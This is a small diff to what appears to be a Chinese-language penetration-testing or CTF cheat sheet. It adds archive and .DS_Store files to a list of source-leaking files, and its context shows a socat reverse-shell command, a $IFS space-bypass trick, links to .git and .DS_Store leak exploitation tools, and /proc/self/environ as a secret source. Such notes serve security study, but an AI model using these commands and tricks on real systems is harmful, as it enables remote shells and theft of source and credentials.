@@ -15,7 +15,8 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080
 空格可以使用$IFS代替
 
 ## 敏感文件
-robots.txt .git .svn .swp ~ .bak 源码，目录泄露
+robots.txt .git .svn .swp ~ .bak .zip .rar .DS_Store源码，目录泄露
+
 .git泄露利用EXP:https://github.com/lijiejie/GitHack
 .DS_Store 利用: https://github.com/lijiejie/ds_store_exp
 进程环境变量: /proc/self/environ 
